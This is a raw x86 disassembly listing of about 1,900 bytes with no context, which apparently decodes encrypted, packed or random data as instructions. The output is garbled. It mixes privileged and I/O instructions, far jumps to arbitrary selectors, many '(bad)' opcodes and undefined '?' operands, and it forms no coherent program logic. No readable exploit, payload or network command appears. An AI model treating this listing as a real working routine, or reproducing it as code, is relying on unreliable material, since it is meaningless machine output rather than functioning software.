  421c2d:	mov    eax,ds:0x63c79492
  421c32:	push   esp
  421c33:	xchg   ebx,eax
  421c34:	nop
  421c35:	xchg   ebp,eax
  421c36:	lea    ebp,[esi+edx*1+0x71]
  421c3a:	ret    
  421c3b:	mov    esp,0x8cd7c285
  421c40:	jmp    0xccbd2b42
  421c45:	dec    esi
  421c46:	mov    edx,0xf3162a3a
  421c4b:	and    ebx,DWORD PTR [edi+0x39]
  421c4e:	add    ch,ah
  421c50:	cmp    BYTE PTR [ebx],dl
  421c52:	mov    esp,0xb145157c
  421c57:	bswap  edx
  421c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c5a:	sbb    al,0x27
  421c5c:	add    al,0x47
  421c5e:	jg     0x421bfc
  421c60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c61:	mov    ?,WORD PTR ds:0xbcc0ce21
  421c67:	daa    
  421c68:	inc    ebx
  421c69:	test   al,0xbd
  421c6b:	xchg   edi,eax
  421c6c:	xor    ebx,esi
  421c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c6f:	aad    0xc2
  421c71:	int    0xda
  421c73:	idiv   DWORD PTR ds:0x1fa91d35
  421c79:	aad    0x60
  421c7b:	nop
  421c7c:	jno    0x421c9d
  421c7e:	mov    bl,0xf5
  421c80:	je     0x421c71
  421c82:	push   es
  421c83:	jmp    0x421cb5
  421c85:	cmp    al,BYTE PTR ds:0xba6733ae
  421c8b:	pushf  
  421c8c:	cdq    
  421c8d:	push   esi
  421c8e:	outs   dx,BYTE PTR ds:[esi]
  421c8f:	and    eax,0xcfaf93e3
  421c94:	and    BYTE PTR ds:0x6ba60e67,0x82
  421c9b:	mov    fs,ebx
  421c9d:	in     al,dx
  421c9e:	adc    ecx,DWORD PTR [ebx+0x278c4582]
  421ca4:	mov    ebx,0xa26500d1
  421ca9:	jnp    0x421c4e
  421cab:	jmp    0x5f032f0f
  421cb0:	dec    ebp
  421cb1:	daa    
  421cb2:	shl    BYTE PTR [esi],1
  421cb4:	cmp    esi,esp
  421cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cb7:	jecxz  0x421cc3
  421cb9:	add    ebp,esi
  421cbb:	loope  0x421c62
  421cbd:	nop
  421cbe:	cmp    BYTE PTR [edi],dl
  421cc0:	stos   BYTE PTR es:[edi],al
  421cc1:	scas   eax,DWORD PTR es:[edi]
  421cc2:	iret   
  421cc3:	inc    edx
  421cc4:	jecxz  0x421c9d
  421cc6:	pop    edi
  421cc7:	cli    
  421cc8:	and    edi,DWORD PTR [ebx-0x3b]
  421ccb:	popa   
  421ccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ccd:	xor    BYTE PTR [ebp-0x12],cl
  421cd0:	adc    al,BYTE PTR [edx+0x64a948e0]
  421cd6:	inc    esp
  421cd7:	mov    BYTE PTR [ebx-0x7df27511],al
  421cdd:	and    BYTE PTR [eax-0x408a4631],0xae
  421ce4:	dec    ecx
  421ce5:	dec    ebx
  421ce6:	mov    eax,ds:0x960e86d9
  421ceb:	push   ebp
  421cec:	(bad)  
  421ced:	mov    al,ds:0x62a92df8
  421cf2:	add    ah,BYTE PTR [edx]
  421cf4:	cmp    ebp,DWORD PTR [ebp+0x10]
  421cf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cf8:	loop   0x421d09
  421cfa:	in     al,dx
  421cfb:	out    dx,eax
  421cfc:	jae    0x421c9a
  421cfe:	popa   
  421cff:	repz cld 
  421d01:	adc    DWORD PTR [edi+esi*2+0x1d066c13],esi
  421d08:	xchg   ebp,eax
  421d09:	inc    ecx
  421d0a:	jecxz  0x421d41
  421d0c:	mov    esp,0x60ffcd90
  421d11:	jb     0x421d47
  421d13:	push   esi
  421d14:	cwde   
  421d15:	pop    edx
  421d16:	pop    edx
  421d17:	dec    edi
  421d18:	push   ecx
  421d19:	mov    ss,esp
  421d1b:	adc    BYTE PTR [ecx+0x1c51c605],dh
  421d21:	pusha  
  421d22:	(bad)  
  421d23:	hlt    
  421d24:	in     al,dx
  421d25:	or     al,0x54
  421d27:	xchg   ecx,eax
  421d28:	xchg   ecx,eax
  421d29:	out    dx,eax
  421d2a:	push   0x66dd941
  421d2f:	xor    al,0xa2
  421d31:	mov    ch,0x45
  421d33:	into   
  421d34:	fbstp  TBYTE PTR [esp+edi*4]
  421d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d38:	adc    al,0xf8
  421d3a:	sti    
  421d3b:	into   
  421d3c:	repz es ret 
  421d3f:	sbb    ah,bl
  421d41:	mov    ds:0xfdfb0ec0,eax
  421d46:	outs   dx,BYTE PTR ds:[esi]
  421d47:	adc    eax,0x43fa93f3
  421d4c:	imul   eax,DWORD PTR [edx-0x721e7dc1],0x23
  421d53:	cdq    
  421d54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d55:	test   al,0x90
  421d57:	jnp    0x421dd1
  421d59:	inc    edx
  421d5a:	mov    WORD PTR [edx+0x5e23de22],es
  421d60:	mov    eax,ds:0xaae97347
  421d65:	xchg   esp,eax
  421d66:	xchg   esi,eax
  421d67:	pop    edx
  421d68:	adc    dh,al
  421d6a:	int    0x63
  421d6c:	sub    eax,0xa0637140
  421d71:	ror    bh,1
  421d73:	(bad)
  421d76:	ret    
  421d77:	dec    edi
  421d78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d79:	cmc    
  421d7a:	mov    ch,0x2f
  421d7c:	dec    esi
  421d7d:	jo     0x421d4d
  421d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d80:	repnz xor ecx,esp
  421d83:	cwde   
  421d84:	retf   
  421d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d86:	pusha  
  421d87:	mov    edi,0x2683243b
  421d8c:	call   DWORD PTR [ecx]
  421d8e:	lock pop ecx
  421d90:	popa   
  421d91:	xchg   edi,eax
  421d92:	lds    esi,FWORD PTR [ebx+ebx*2]
  421d95:	cmp    dl,dl
  421d97:	dec    ebp
  421d98:	es xor al,0x2f
  421d9b:	mov    ch,0x66
  421d9d:	or     al,0x7
  421d9f:	es lahf 
  421da1:	ret    
  421da2:	mov    eax,ds:0x5aad34c6
  421da7:	mov    bh,0x68
  421da9:	test   al,0x61
  421dab:	test   eax,0x7373d7c4
  421db0:	or     DWORD PTR [edx+0x4b2194a0],0xa9a022fc
  421dba:	jl     0x421dd9
  421dbc:	loope  0x421da9
  421dbe:	jmp    FWORD PTR [eax+0x2c5981cb]
  421dc4:	xchg   BYTE PTR [edx+esi*2],cl
  421dc7:	fmul   st(5),st
  421dc9:	xchg   edx,eax
  421dca:	jmp    0x421e35
  421dcc:	ins    BYTE PTR es:[edi],dx
  421dcd:	shl    BYTE PTR ds:[edi],0xd
  421dd1:	rcr    BYTE PTR [esi-0x5d],0x52
  421dd5:	cmp    DWORD PTR [esi],ebp
  421dd7:	popa   
  421dd8:	xchg   ebx,eax
  421dd9:	sbb    bl,BYTE PTR [esi+0x445cda89]
  421ddf:	push   ebx
  421de0:	mov    esi,0x19150cca
  421de5:	and    eax,0xecd15843
  421dea:	jbe    0x421e0f
  421dec:	popf   
  421ded:	inc    eax
  421dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421def:	(bad)  
  421df0:	xor    DWORD PTR [ecx+0x5a5a124d],edi
  421df6:	or     DWORD PTR [esi+ebp*2+0x674333],esp
  421dfd:	(bad)  
  421dfe:	pop    eax
  421dff:	jmp    0xa42b:0x7ee1da83
  421e06:	mov    edi,0xdd47a5f1
  421e0b:	xchg   esp,eax
  421e0c:	xor    BYTE PTR [ebx],bh
  421e0e:	push   ebx
  421e0f:	xchg   esi,eax
  421e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e11:	push   es
  421e12:	jl     0x421e66
  421e14:	push   ecx
  421e15:	test   BYTE PTR [eax],al
  421e17:	cmc    
  421e18:	dec    bl
  421e1a:	xchg   ebx,eax
  421e1b:	(bad)  
  421e1c:	ss dec ebp
  421e1e:	pop    eax
  421e1f:	mov    cl,0xdd
  421e21:	leave  
  421e22:	pop    es
  421e23:	scas   al,BYTE PTR es:[edi]
  421e24:	fsub   QWORD PTR [edx-0x1a]
  421e27:	mov    WORD PTR [esi-0xf5419eb],?
  421e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e2e:	mov    BYTE PTR [edx+0x567efad9],bh
  421e34:	mov    ebx,0x1d88dcf0
  421e39:	cs pop esp
  421e3b:	cmp    dh,BYTE PTR [esi+0x583a5f9]
  421e41:	std    
  421e42:	addr16 pop ebx
  421e44:	and    al,0x9
  421e46:	xor    bl,dl
  421e48:	ss inc ebx
  421e4a:	cmp    al,ah
  421e4c:	push   ebx
  421e4d:	sub    DWORD PTR ds:0x4045d58d,0x3bd07144
  421e57:	loope  0x421ecf
  421e59:	add    al,0x78
  421e5b:	inc    esi
  421e5c:	sbb    BYTE PTR [ebx],ch
  421e5e:	sbb    al,0x2f
  421e60:	xchg   ebx,eax
  421e61:	imul   edi,DWORD PTR [ebx+0x21c58fa1],0x13e7d168
  421e6b:	arpl   WORD PTR [eax-0x69ab5f54],sp
  421e71:	out    dx,al
  421e72:	das    
  421e73:	adc    edi,0x3000f329
  421e79:	xchg   ecx,eax
  421e7a:	mov    ebp,0x3bcb171f
  421e7f:	sub    al,0x8c
  421e81:	(bad)  
  421e83:	inc    ebx
  421e84:	rol    ch,0xde
  421e87:	mov    ebx,0xbf2cb631
  421e8c:	cli    
  421e8d:	and    ebp,DWORD PTR [edx+0x12ba9e1a]
  421e93:	push   ss
  421e94:	fst    DWORD PTR [ebx-0x3be8e531]
  421e9a:	js     0x421e20
  421e9c:	push   ds
  421e9d:	mov    WORD PTR [ebx-0xd],gs
  421ea0:	int    0x92
  421ea2:	fsubp  st(6),st
  421ea4:	out    dx,al
  421ea5:	mov    esp,0x8abeae0f
  421eaa:	and    al,bh
  421eac:	pop    ebx
  421ead:	ret    0xcc26
  421eb0:	lds    ecx,FWORD PTR [esi]
  421eb2:	mov    al,0x5b
  421eb4:	test   eax,0xddd2d2d5
  421eb9:	loopne 0x421ea7
  421ebb:	test   DWORD PTR [ebp+0x2bd566bf],ebx
  421ec1:	lods   al,BYTE PTR ds:[esi]
  421ec2:	pop    edx
  421ec3:	cli    
  421ec4:	pop    esp
  421ec5:	push   0x3f
  421ec7:	pop    esp
  421ec8:	fst    QWORD PTR [ecx+0x32]
  421ecb:	inc    ecx
  421ecc:	cmp    dl,BYTE PTR [ecx+eiz*2+0x16]
  421ed0:	pop    ds
  421ed1:	inc    edi
  421ed2:	inc    ebx
  421ed3:	jg     0x421f0e
  421ed5:	cmp    dh,bh
  421ed7:	jns    0x421ec3
  421ed9:	mov    WORD PTR [eax+0x3ed634d6],gs
  421edf:	out    dx,eax
  421ee0:	xchg   esp,eax
  421ee1:	sbb    BYTE PTR [edi+eiz*4+0x32],ch
  421ee5:	es sub eax,0x81a84c83
  421eeb:	stos   DWORD PTR es:[edi],eax
  421eec:	mov    ebx,DWORD PTR [esi-0x48]
  421eef:	mov    ch,0xa4
  421ef1:	sbb    dh,BYTE PTR [eax+0x5c]
  421ef4:	loopne 0x421f69
  421ef6:	ds jp  0x421f73
  421ef9:	dec    ebx
  421efa:	pop    esp
  421efb:	inc    ebp
  421efc:	push   cs
  421efd:	lock dec edx
  421eff:	outs   dx,BYTE PTR ds:[esi]
  421f00:	je     0x421f7e
  421f02:	sahf   
  421f03:	cwde   
  421f04:	mov    esp,0xec4ccb0
  421f09:	cli    
  421f0a:	mov    ah,0x79
  421f0c:	pop    ds
  421f0d:	add    DWORD PTR [edx],ebx
  421f0f:	push   ebp
  421f10:	jb     0x421f67
  421f12:	push   cs
  421f13:	out    0x8d,eax
  421f15:	and    eax,0xe11a626c
  421f1a:	sar    ah,1
  421f1c:	push   cs
  421f1d:	int3   
  421f1e:	jle    0x421f8f
  421f20:	jecxz  0x421f2c
  421f22:	jnp    0x421fa3
  421f24:	repnz sti 
  421f26:	inc    edx
  421f27:	inc    eax
  421f28:	inc    edi
  421f29:	and    esi,edx
  421f2b:	adc    cl,al
  421f2d:	nop
  421f2e:	inc    ebp
  421f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f30:	mov    ebp,0x819e6ba3
  421f35:	call   0x7d6fc4b8
  421f3a:	xchg   BYTE PTR [ebx],cl
  421f3c:	into   
  421f3d:	shl    DWORD PTR [edi],0xe0
  421f40:	fsub   DWORD PTR [ebx+0x5]
  421f43:	imul   eax,DWORD PTR [ebp+0x1c],0x9a19b8d0
  421f4a:	(bad)  
  421f4b:	aas    
  421f4c:	adc    DWORD PTR [edi+0x2a],edi
  421f4f:	cmp    ebp,esp
  421f51:	sub    ah,BYTE PTR ds:0xd75efe0a
  421f57:	in     eax,0x2f
  421f59:	mov    esi,DWORD PTR [esi+eax*4]
  421f5c:	cmp    eax,0x2cd8a56f
  421f61:	arpl   WORD PTR ds:0xaba44237,di
  421f67:	push   cs
  421f68:	mov    eax,0xad91cac
  421f6d:	jp     0x421f80
  421f6f:	mov    dl,0x7b
  421f71:	pop    eax
  421f72:	mov    eax,0xc48f8ee0
  421f77:	iret   
  421f78:	mov    BYTE PTR [edi],bh
  421f7a:	jbe    0x421f93
  421f7c:	stc    
  421f7d:	add    ebp,DWORD PTR [edx]
  421f7f:	addr16 pop ebp
  421f81:	repnz inc ecx
  421f83:	cmc    
  421f84:	cwde   
  421f85:	and    esi,DWORD PTR [eax+0x6b]
  421f88:	ret    
  421f89:	outs   dx,BYTE PTR ds:[esi]
  421f8a:	std    
  421f8b:	ja     0x422009
  421f8d:	pop    ds
  421f8e:	aas    
  421f8f:	jecxz  0x421f71
  421f91:	lds    eax,FWORD PTR [ebx]
  421f93:	mov    esp,0x6de6354
  421f98:	xchg   edi,eax
  421f99:	ss inc edx
  421f9b:	leave  
  421f9c:	stc    
  421f9d:	jo     0x421f7c
  421f9f:	xor    DWORD PTR [edi-0x35],esi
  421fa2:	sti    
  421fa3:	jb     0x421faa
  421fa5:	imul   esi,DWORD PTR [esi-0x3548c324],0xf598165f
  421faf:	mov    dl,0x84
  421fb1:	loopne 0x421f7a
  421fb3:	or     al,0x71
  421fb5:	xchg   DWORD PTR [ebp+0x5f],ecx
  421fb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fb9:	inc    esp
  421fba:	xor    cl,al
  421fbc:	sub    dl,dl
  421fbe:	out    0x5b,al
  421fc0:	inc    edx
  421fc1:	mov    ds:0x537f4be4,eax
  421fc6:	xchg   esp,eax
  421fc7:	ins    BYTE PTR es:[edi],dx
  421fc8:	xlat   BYTE PTR ds:[ebx]
  421fc9:	mov    dh,0xb4
  421fcb:	shl    BYTE PTR [esi-0x4a],1
  421fce:	stos   BYTE PTR es:[edi],al
  421fcf:	jae    0x422047
  421fd1:	pop    ebp
  421fd2:	pop    eax
  421fd3:	jo     0x421f62
  421fd5:	ret    
  421fd6:	sbb    bh,BYTE PTR [esi+edi*4-0x5c]
  421fda:	aaa    
  421fdb:	xor    dl,dl
  421fdd:	push   edi
  421fde:	in     al,0x5b
  421fe0:	lahf   
  421fe1:	fadd   DWORD PTR [esi-0x2b7cd74b]
  421fe7:	imul   eax,DWORD PTR [edx],0xffffffd2
  421fea:	mov    DWORD PTR [edi+0x19197686],edi
  421ff0:	in     eax,0x4a
  421ff2:	mov    edx,DWORD PTR [esi-0x76]
  421ff5:	inc    edx
  421ff6:	mov    ch,0x7d
  421ff8:	fld    DWORD PTR [ecx]
  421ffa:	inc    ebx
  421ffb:	push   ebx
  421ffc:	pop    ss
  421ffd:	popf   
  421ffe:	out    dx,eax
  421fff:	pushf  
  422000:	add    bh,cl
  422002:	lods   al,BYTE PTR ds:[esi]
  422003:	jl     0x422082
  422005:	pop    es
  422006:	out    dx,al
  422007:	pop    esi
  422008:	cdq    
  422009:	or     DWORD PTR [edi+eiz*4-0x248406e6],esp
  422010:	sbb    BYTE PTR [esi+0x31],bh
  422013:	call   0xdf1d:0x8c09f92e
  42201a:	adc    DWORD PTR [eax+ebp*8-0x3b8f277b],ebp
  422021:	dec    edx
  422022:	fisttp QWORD PTR [ebx+ecx*2+0x2f9c7c75]
  422029:	pop    esi
  42202a:	sub    eax,0xec66552e
  42202f:	mov    bl,BYTE PTR [edx+0x49]
  422032:	cmp    DWORD PTR [ebx-0x39],ebp
  422035:	shl    BYTE PTR [ecx+0x1a1c24cb],cl
  42203b:	jns    0x422076
  42203d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42203e:	and    eax,0xa5313f5
  422043:	es push ss
  422045:	imul   eax,DWORD PTR [esi],0x6a
  422048:	mov    edx,edi
  42204a:	push   0x7ec51b57
  42204f:	dec    edx
  422050:	in     al,dx
  422051:	mov    ds:0xbfd33524,al
  422056:	enter  0x8a32,0xa3
  42205a:	pop    esp
  42205b:	inc    edi
  42205c:	loope  0x422026
  42205e:	aas    
  42205f:	jmp    0x4490:0x475a6bb6
  422066:	ror    DWORD PTR [edx+0xb07f648],cl
  42206c:	ja     0x4220d9
  42206e:	sbb    eax,0xe46b672c
  422073:	out    dx,eax
  422074:	xchg   edx,eax
  422075:	xor    BYTE PTR [ebp+0x24],al
  422078:	pop    esp
  422079:	arpl   WORD PTR [ecx+0x4c],si
  42207c:	lds    ecx,FWORD PTR [ebp+0x25]
  42207f:	loope  0x422006
  422081:	cwde   
  422082:	add    DWORD PTR [esi+0x38db6a64],edx
  422088:	mov    bl,0xa0
  42208a:	dec    ecx
  42208b:	xchg   ebx,eax
  42208c:	sub    DWORD PTR [edx],ebx
  42208e:	fisttp WORD PTR [edi-0x1cc73b93]
  422094:	cwde   
  422095:	mov    ds:0x1fc3c446,eax
  42209a:	sbb    bl,BYTE PTR ss:[edi-0x73]
  42209e:	in     eax,dx
  42209f:	aas    
  4220a0:	inc    esp
  4220a1:	push   eax
  4220a2:	in     eax,dx
  4220a3:	and    eax,0x17b142b9
  4220a8:	sub    eax,0xe9cab446
  4220ad:	push   eax
  4220ae:	stc    
  4220af:	outs   dx,BYTE PTR ds:[esi]
  4220b0:	cmp    cl,BYTE PTR [esp+ebp*8]
  4220b3:	dec    ecx
  4220b4:	add    al,0x16
  4220b6:	stos   BYTE PTR es:[edi],al
  4220b7:	dec    edi
  4220b8:	push   edx
  4220b9:	js     0x422125
  4220bb:	cs iret 
  4220bd:	add    al,0xf6
  4220bf:	push   ecx
  4220c0:	inc    ebp
  4220c1:	mov    al,0xa9
  4220c3:	adc    eax,0xdadcfc43
  4220c8:	aaa    
  4220c9:	xchg   ecx,eax
  4220ca:	adc    esi,edi
  4220cc:	(bad)  
  4220cd:	pop    ebx
  4220ce:	lahf   
  4220cf:	mov    eax,ds:0xf12662ed
  4220d4:	out    dx,eax
  4220d5:	lds    esi,FWORD PTR [ecx+0x2d7f5c44]
  4220db:	jns    0x422083
  4220dd:	nop
  4220de:	ror    DWORD PTR [edx+0x2f7496de],1
  4220e4:	and    DWORD PTR [eax-0x6d1bfc5d],edi
  4220ea:	and    ch,BYTE PTR [ecx]
  4220ec:	dec    ebx
  4220ed:	or     eax,DWORD PTR [edx-0x24]
  4220f0:	adc    ecx,DWORD PTR [eax+eiz*8-0x25]
  4220f4:	or     eax,0xba5bb7d3
  4220f9:	adc    esi,DWORD PTR [edi+eiz*8+0x4e9f9f4b]
  422100:	in     al,0xfc
  422102:	xchg   ah,al
  422104:	xchg   ebx,eax
  422105:	scas   al,BYTE PTR es:[edi]
  422106:	aam    0x81
  422108:	adc    dh,BYTE PTR [ecx]
  42210a:	loope  0x42213c
  42210c:	add    BYTE PTR [ebx+ebx*2-0x51],bh
  422110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422111:	mov    eax,0x3bda059e
  422116:	inc    esp
  422117:	test   DWORD PTR [ebp-0x17],0x1c12d5f
  42211e:	inc    esp
  42211f:	jo     0x4220cd
  422121:	dec    edx
  422122:	stos   BYTE PTR es:[edi],al
  422123:	ror    DWORD PTR [ecx],0x72
  422126:	jae    0x4220ab
  422128:	mov    ah,0xcf
  42212a:	inc    esp
  42212b:	ins    BYTE PTR es:[edi],dx
  42212c:	adc    BYTE PTR [eax],0xdb
  42212f:	leave  
  422130:	nop
  422131:	jp     0x4220c2
  422133:	scas   eax,DWORD PTR es:[edi]
  422134:	out    0xf,al
  422136:	ins    DWORD PTR es:[edi],dx
  422137:	pop    esp
  422138:	out    dx,eax
  422139:	outs   dx,DWORD PTR ds:[esi]
  42213a:	mov    al,ds:0x9aa73869
  42213f:	aad    0xa6
  422141:	fimul  WORD PTR [edi+0x52]
  422144:	fistp  QWORD PTR [ebp+0x524af294]
  42214a:	jl     0x422194
  42214c:	int    0xd1
  42214e:	loopne 0x4221bc
  422150:	sti    
  422151:	int3   
  422152:	shl    BYTE PTR [eax+0x6369e2ba],1
  422158:	dec    edx
  422159:	sbb    dh,BYTE PTR [eax-0x7a462573]
  42215f:	sub    DWORD PTR [edi+0x61],0x5911dcfa
  422166:	sbb    eax,0x3e4fd3c6
  42216b:	aam    0x1b
  42216d:	inc    edx
  42216e:	push   eax
  42216f:	push   esp
  422170:	dec    ebx
  422171:	scas   al,BYTE PTR es:[edi]
  422172:	retf   0x78b1
  422175:	sub    edx,DWORD PTR [esi+0x3b]
  422178:	cli    
  422179:	mov    WORD PTR [edx-0x11a2acd],?
  42217f:	mov    ebx,0x38c6930
  422185:	loope  0x4221d3
  422187:	and    DWORD PTR [ebx-0xe9199bf],0x53
  42218e:	sbb    edx,DWORD PTR [eax-0x61]
  422191:	inc    edi
  422192:	iret   
  422193:	cmp    ecx,DWORD PTR [ebp+0x33e7bf1a]
  422199:	aas    
  42219a:	and    DWORD PTR [edi-0x32],edx
  42219d:	or     BYTE PTR [esi+ebp*2],bl
  4221a0:	test   DWORD PTR [ebx+ebx*8+0x3b76fa6c],0xe9aff180
  4221ab:	jle    0x4221f3
  4221ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221ae:	sahf   
  4221af:	xor    eax,0xd4c41508
  4221b4:	jns    0x4221cc
  4221b6:	xchg   esp,edx
  4221b8:	ret    0xc4a8
  4221bb:	cmp    DWORD PTR [ebx],0x2a
  4221be:	fdivrp st(7),st
  4221c0:	add    esp,edi
  4221c2:	jnp    0x42215f
  4221c4:	rcr    DWORD PTR [ebp+ebp*8-0x4d46b791],1
  4221cb:	repnz pop es
  4221cd:	or     bh,cl
  4221cf:	inc    eax
  4221d0:	inc    esp
  4221d1:	jle    0x4221a3
  4221d3:	adc    al,0xa7
  4221d5:	adc    DWORD PTR [edx+0x79],eax
  4221d8:	(bad)  
  4221d9:	xrelease mov BYTE PTR [ebp-0x78f1c450],ah
  4221e0:	xor    dh,0x2e
  4221e3:	adc    BYTE PTR [esi+edi*8],ch
  4221e6:	cmp    edi,DWORD PTR [ecx]
  4221e8:	std    
  4221e9:	jne    0x422260
  4221eb:	jbe    0x4221ca
  4221ed:	jmp    0xe554b772
  4221f2:	mov    dl,0x8d
  4221f4:	stc    
  4221f5:	fdiv   st,st(7)
  4221f7:	ror    dh,cl
  4221f9:	mov    ch,0xf6
  4221fb:	jp     0x422196
  4221fd:	shr    DWORD PTR [edi-0x71abfcb0],cl
  422203:	xor    DWORD PTR [edi],ebx
  422205:	aas    
  422206:	mov    ah,0x77
  422208:	mov    bh,0x58
  42220a:	jl     0x4221e2
  42220c:	ficom  WORD PTR [eax]
  42220e:	daa    
  42220f:	call   0x8ee3:0x70c7b9eb
  422216:	shl    DWORD PTR [edx+0x344b1710],0x1e
  42221d:	bswap  ebp
  42221f:	mov    cl,0x9c
  422221:	imul   edi,edi,0xffffffd0
  422224:	(bad)  
  422225:	sub    ebx,esp
  422227:	push   eax
  422228:	in     eax,0xb5
  42222a:	daa    
  42222b:	mov    ecx,0x19a08cc8
  422230:	(bad)  
  422231:	mov    dl,0x93
  422233:	cmp    esp,DWORD PTR [edx]
  422235:	sbb    eax,0xafca0e6a
  42223a:	xchg   DWORD PTR [eax-0x64a611e6],esp
  422240:	dec    ecx
  422241:	mov    DWORD PTR [esi+0x4a],edx
  422244:	aas    
  422245:	jbe    0x42222b
  422247:	inc    esp
  422248:	inc    ebp
  422249:	imul   BYTE PTR [ebx]
  42224b:	sbb    cl,ah
  42224d:	addr16 push eax
  42224f:	and    dl,dh
  422251:	jle    0x422276
  422253:	and    DWORD PTR [ecx-0x55234571],ecx
  422259:	(bad)  
  42225a:	(bad)  
  42225b:	jecxz  0x422215
  42225d:	sbb    ebx,ebx
  42225f:	add    ebp,DWORD PTR [ecx+0x1a]
  422262:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422263:	hlt    
  422264:	mov    ds:0xa907a08e,eax
  422269:	xor    al,0x9c
  42226b:	test   eax,0x927e8cd3
  422270:	sub    BYTE PTR [esi-0x2713354f],bl
  422276:	retf   0xd021
  422279:	or     al,0x11
  42227b:	or     BYTE PTR [eax+0x1de30161],bl
  422281:	pop    ds
  422282:	mov    ebp,DWORD PTR [ebx+0x40]
  422285:	pop    ecx
  422286:	std    
  422287:	test   eax,0xd81fc347
  42228c:	scas   eax,DWORD PTR es:[edi]
  42228d:	repz dec BYTE PTR [ebx+esi*1-0x14]
  422292:	repz call 0xd76ef6a2
  422298:	pop    es
  422299:	mov    dh,0xe2
  42229b:	sbb    bh,ch
  42229d:	sbb    eax,0xd50e0b9e
  4222a2:	movlps QWORD PTR [edx+0x699b9a3e],xmm6
  4222a9:	jo     0x4222a1
  4222ab:	and    DWORD PTR [esi-0x51],esi
  4222ae:	inc    edx
  4222af:	sbb    BYTE PTR [ebx],0x7b
  4222b2:	cmp    esi,DWORD PTR [esi+edi*1-0x14]
  4222b6:	fiadd  DWORD PTR [ebx+0x12]
  4222b9:	fsubr  QWORD PTR [edx+ecx*1-0x5e14d966]
  4222c0:	jmp    0xec34:0x3d3e155d
  4222c7:	pop    es
  4222c8:	in     eax,dx
  4222c9:	inc    edx
  4222ca:	test   eax,0x1d92b8ee
  4222cf:	mov    BYTE PTR [esi+0x78],al
  4222d2:	mov    bl,0xcb
  4222d4:	leave  
  4222d5:	out    dx,al
  4222d6:	out    0xd9,al
  4222d8:	sub    BYTE PTR [ebx],0x9
  4222db:	xchg   edx,eax
  4222dc:	stc    
  4222dd:	jl     0x42235a
  4222df:	mov    ebp,0x1a3b261
  4222e4:	bound  edx,QWORD PTR [edi+0x19]
  4222e7:	dec    esp
  4222e8:	inc    esi
  4222e9:	add    eax,0x600d88b1
  4222ee:	cmp    eax,0x817c936d
  4222f3:	bound  eax,QWORD PTR [ebx+0x7b94c63a]
  4222f9:	pop    edi
  4222fa:	jbe    0x4222fd
  4222fc:	inc    esp
  4222fd:	xchg   ebx,eax
  4222fe:	ret    
  4222ff:	jecxz  0x422356
  422301:	out    0xaf,eax
  422303:	pop    ss
  422304:	pop    edx
  422305:	cmc    
  422306:	ficomp WORD PTR [edx-0x76d756ab]
  42230c:	js     0x422308
  42230e:	fild   QWORD PTR [edx+0x5462d890]
  422314:	les    edi,FWORD PTR [ebp+ebp*2+0x5d528b98]
  42231b:	sti    
  42231c:	add    al,0x93
  42231e:	push   edi
  42231f:	mov    edx,esi
  422321:	shl    BYTE PTR [esi-0x3d51031e],cl
  422327:	or     BYTE PTR [edi],ah
  422329:	sub    DWORD PTR [esp+edx*1+0x38],0x45f0f039
  422331:	mov    eax,0xfdab6bf4
  422336:	or     dh,BYTE PTR [eax]
  422338:	push   ss
  422339:	fadd   st,st(0)
  42233b:	sub    bl,al
  42233d:	repz mov ebp,0xd4cbc2a2
  422343:	ds jb  0x422379
  422346:	pushf  
  422347:	sub    DWORD PTR [edi-0x132d892a],ebx
  42234d:	mov    ebp,0xdf0ccdaf
  422352:	arpl   WORD PTR [edi+0x4cf57fa5],ax
  422358:	lock leave 
  42235a:	add    al,0x19
  42235c:	ja     0x422329
  42235e:	mov    bl,0x88
  422360:	shl    DWORD PTR [ecx-0x2b],1
  422363:	mov    BYTE PTR [ebp+0x53863dd0],dl
  422369:	dec    esi
  42236a:	adc    cl,BYTE PTR [ecx]
  42236c:	enter  0xfaf8,0x35
  422370:	stos   BYTE PTR es:[edi],al
  422371:	imul   edi,DWORD PTR [ebx-0x77],0x56
  422375:	cmp    ebp,DWORD PTR [ecx+0xa]
  422378:	or     edx,DWORD PTR [esi-0x54]
  42237b:	ret    
  42237c:	das    
  42237d:	and    ebp,DWORD PTR [esi]
  42237f:	sub    eax,0x47928244
  422384:	and    dl,0x5f
  422387:	jge    0x422343
  422389:	mov    esp,0x82cbb754
  42238e:	push   ebx
  42238f:	pusha  
  422390:	xchg   edx,eax
  422391:	push   esi
  422392:	push   esp
  422393:	push   ebp
  422394:	mov    ecx,0x874b06c0
  422399:	ret    
  42239a:	(bad)  
  42239b:	xor    ch,BYTE PTR [ebx]
  42239d:	in     eax,dx
  42239e:	jge    0x42240a
  4223a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223a1:	xchg   edi,eax
  4223a2:	jp     0x4223e7
  4223a4:	test   esi,0x317dbcda
  4223aa:	and    eax,0xc84a8d3d
  4223af:	add    DWORD PTR [eax],ebx
  4223b1:	inc    esi
  4223b2:	stos   DWORD PTR es:[edi],eax
  4223b3:	sbb    ebx,ecx
  4223b5:	sbb    al,BYTE PTR [eax+0x35]
  4223b8:	iret   
  4223b9:	outs   dx,DWORD PTR ds:[esi]
  4223ba:	sub    al,0xf7
  4223bc:	les    esp,FWORD PTR [edi]
  4223be:	pop    ecx
  4223bf:	cs add eax,0xd52e4a7f
